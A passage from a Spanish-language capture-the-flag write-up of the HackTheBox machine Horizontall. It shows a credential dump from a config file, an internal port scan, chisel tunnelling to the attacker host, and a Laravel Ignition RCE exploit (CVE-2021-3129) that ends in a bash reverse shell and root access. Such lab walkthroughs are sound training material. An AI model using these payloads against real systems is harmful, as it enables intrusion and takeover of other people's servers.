strapi@horizontall:~/myapi$ ls -la config/environments/development/
total 32
drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:38 <span class=code-blue>.</span>
drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 <span class=code-blue>..</span>
-rw-r--r-- 1 strapi strapi  135 May 26 14:31 custom.json
-rw-rw-r-- 1 strapi strapi  351 May 26 14:31 database.json
-rw-r--r-- 1 strapi strapi  439 May 26 14:31 request.json
-rw-r--r-- 1 strapi strapi  164 May 26 14:31 response.json
-rw-r--r-- 1 strapi strapi  529 May 26 14:31 security.json
-rw-r--r-- 1 strapi strapi  159 May 26 14:31 server.json
strapi@horizontall:~/myapi$ cat config/environments/development/database.json  
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
</code></pre></div>
<p>Desafortunadamente, no hay nada que hacer aquí, ya que la contraseña de <code>admin</code> se cambió con el <em>exploit</em> anterior y no hay más bases de datos aparte de <code>strapi</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| strapi             |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> quit
Bye
</code></pre></div>
<p>Aquí debemos recordar que vimos un archivo PHP y un proyecto en <code>/home/developer</code>. Entonces, podemos realizar un escaneo de puertos interno mediante un simple <em>script</em> en Bash:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:~/myapi$ cd /tmp
strapi@horizontall:/tmp$ echo -e '#!/bin/bash\n\nfor i in $(seq 1 65535); do\n  timeout 1 echo 2>/dev/null > /dev/tcp/127.0.0.1/$i && echo "Port $i: open" &\ndone; wait' > .scan.sh  
strapi@horizontall:/tmp$ chmod +x .scan.sh
strapi@horizontall:/tmp$ cat .scan.sh
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/bin/bash</span>

<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class=mtk4>$(seq</span> <span class=mtk4>1</span> <span class=mtk4>65535)</span><span class=mtk5>;</span> <span class=mtk5>do</span>
  <span class=mtk1>timeout</span> <span class=mtk1>1</span> <span class=mtk7>echo</span> <span class=mtk5>2&gt;</span><span class=mtk1>/dev/null</span> <span class=mtk5>&gt;</span> <span class=mtk1>/dev/tcp/127.0.0.1/$i</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk7>echo</span> <span class=mtk4>"Port</span> <span class=mtk1>$i</span><span class=mtk4>:</span> <span class=mtk4>open"</span> <span class=mtk5>&amp;</span>  
<span class=mtk5>done;</span> <span class=mtk7>wait</span>
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:/tmp$ ./.scan.sh  
Port 22: open
Port 80: open
Port 1337: open
Port 3306: open
Port 8000: open
Port 57900: open
</code></pre></div>
<p>Una manera más sencilla de ejecutar puertos abiertos es mediante <code>netstat</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:/tmp$ netstat -nat | grep LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               <span class=code-red>LISTEN</span>  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               <span class=code-red>LISTEN</span>
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               <span class=code-red>LISTEN</span>
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               <span class=code-red>LISTEN</span>
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               <span class=code-red>LISTEN</span>
tcp6       0      0 :::80                   :::*                    <span class=code-red>LISTEN</span>
tcp6       0      0 :::22                   :::*                    <span class=code-red>LISTEN</span>
</code></pre></div>
<p>Y vemos que hay más puertos que no están expuestos (y por tanto, no reportados por <code>nmap</code>).</p>
<p>El puerto 1337 contiene la página web de <code>http://api-prod.horizontall.htb</code>, porque así se encuentra configurado el servidor nginx:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:/tmp$ cat /etc/nginx/sites-enabled/horizontall.htb  
server {
    # server block for 'horizontall.htb' domain
    listen 80;
    listen [::]:80;
    server_name horizontall.htb www.horizontall.htb;
    root /var/www/html/horizontall;
    index index.html index.htm;
    location / {
        try_files $uri $uri/ =404;
    }
}

server {
     listen [::]:80;
     listen 80;

     server_name api-prod.horizontall.htb;

     location / {
          proxy_pass http://localhost:1337;
          proxy_http_version 1.1;
          proxy_set_header Upgrade $http_upgrade;
          proxy_set_header Connection 'upgrade';
          proxy_set_header Host $host;
          proxy_cache_bypass $http_upgrade;
    }
}

server {
    # server block for all the other requests
    # this block will be a default server block listening on port 80
    listen 80 default_server;
    listen [::]:80 default_server;
    # close the connection immediately
    return 301 http://horizontall.htb;
}
</code></pre></div>
<p>Aquí podemos comprobar que <code>http://localhost:8000</code> contiene una página web hecha en Laravel (un <em>framework</em> de PHP):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:/tmp$ curl -I 127.0.0.1:8000
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date:
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IkRsV2pwUEV3Q20zVlFQZzh4Y2JlblE9PSIsInZhbHVlIjoibkdhcjM0U2pNTWErUXQzUkdUSDZWL2FiZnIvS2J2cjFEWGlYRjBvZEdDZElZZGt4OGJOUnhVdWJXdndiL2ZnSXNiZWI3ejl2dXczVVdXT1JKQ0h6TDllUy95RzBhRE1qSDRaYmZmWlBkTGNVbHhXUDIwT2xHM1pyN0huQ3BrNlUiLCJtYWMiOiI1NjYxZGM2NWFiZGNhMWNmZmIwMGQwMzZhZjYzZTkyYTgzNGY2ZWJkYTdlYmQ4OGVjZTBlYmNmYjY3ZGM3MGNkIn0%3D; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IlkyV3AxWUZ3U3ozL0RnTkNwalQ2SWc9PSIsInZhbHVlIjoialFWbE00dzNCa01yeXUxaEU4c08ydU05M1F4WHUzbFp3eUNDLzNFVWNXcGd0YVM4SW9FTHdkVW4xR2Z0V3lxeWx1d2taMFMvdFV5SThDVWNTcFdkT3dXZVBBcnVMS2FuVmlXdTI3aFFVNWF6b0hVYzJYdThZSmJiZmJXQ1ZxNXkiLCJtYWMiOiI3MTI0NTk1ZDE5NzE4N2YwYzAwM2MwOWJlY2NiMDFkMmU5YTY2ZTliNWU1MTk4OTAxNmM0YWQ4M2M0YjA5YWRmIn0%3D; Max-Age=7200; path=/; httponly; samesite=lax  
</code></pre></div>
<p>En este punto, será conveniente realizar un reenvío de puertos mediante <a href=https://github.com/jpillora/chisel><code>chisel</code></a> para acceder al puerto 8000 desde la máquina de atacante:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chisel</span> server -p 1337 --reverse
server: Reverse tunnelling enabled
server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY=  
server: Listening on http://0.0.0.0:1337
server: session#1: tun: proxy#R:8000=>8000: Listening
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:/tmp$ curl 10.10.17.44/chisel -o .chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2315k  100 2315k    0     0   402k      0  0:00:05  0:00:05 --:--:--  409k
strapi@horizontall:/tmp$ chmod +x .chisel
strapi@horizontall:/tmp$ ./.chisel client 10.10.17.44:1337 R:8000:127.0.0.1:8000  
client: Connecting to ws://10.10.17.44:1337
client: Connected (Latency 109.928393ms)
</code></pre></div>
<h2 id=explotando-laravel>Explotando Laravel</h2>
<p>Ahora, tenemos acceso a la página web de Laravel desde la máquina de atacante entrando en <code>http://127.0.0.1:8000</code>:</p>
<p><img src=/images/HTB/Horizontall/Horizontall-laravel.png alt="Horizontall Laravel"></p>
<p>Esta página dice que se usa Laravel v8 (PHP v7.4.18). De nuevo, podemos encontrar un <em>exploit</em> para esta versión. El que está en Exploit-DB no funcionó correctamente, pero existe otro que además viene con explicación disponible <a href=https://www.ambionics.io/blog/laravel-debug-rce>aquí</a> (CVE-2021-3129), que tiene un enlace al <a href=https://github.com/ambionics/laravel-exploits><em>exploit</em></a>.</p>
<p>Primero, necesitamos clonar un repositorio (aparte del <em>exploit</em>) para disponer de <a href=https://github.com/ambionics/phpggc><code>phpggc</code></a>. Luego, podemos seguir los pasos mostrados en el <em>exploit</em> para conseguir ejecución remota de comandos (RCE).</p>
<p>Como prueba de concepto, podemos probar a ejecutar el comando <code>id</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>git</span> clone https://github.com/ambionics/phpggc

<span class=code-cyan>$</span> <span class=code-dark-green>php</span> -d<span class=code-dark-yellow>'phar.readonly=0'</span> ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system id  

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> laravel-ignition-rce.py http://localhost:8000 ./exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
</code></pre></div>
<p>Y vemos que somos <code>root</code>.</p>
<h2 id=escalada-de-privilegios>Escalada de privilegios</h2>
<p>Entonces, a continuación lanzamos el <em>exploit</em> pero con un comando para conseguir una <em>reverse shell</em> en la máquina:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>php</span> -d<span class=code-dark-yellow>'phar.readonly=0'</span> ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system <span class=code-dark-yellow>"bash -c 'bash -i >& /dev/tcp/10.10.17.44/4444 0>&1'"</span>  

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> laravel-ignition-rce.py http://localhost:8000 ./exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
</code></pre></div>
<p>Y finalmente, conseguimos acceso como <code>root</code> y podemos leer la <em>flag</em> <code>root.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.105.
Ncat: Connection from 10.10.11.105:49338.
bash: cannot set terminal process group (17432): Inappropriate ioctl for device  
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# cat /root/root.txt
0d37c358b4147cb69b83ef1aa753655f
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#enumeración-web>Enumeración web</a></li>
<li><a href=#explotando-strapi>Explotando Strapi</a></li>
<li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li>
<li><a href=#explotando-laravel>Explotando Laravel</a></li>
<li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li>
</ul>
</nav>
</div>
</aside>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>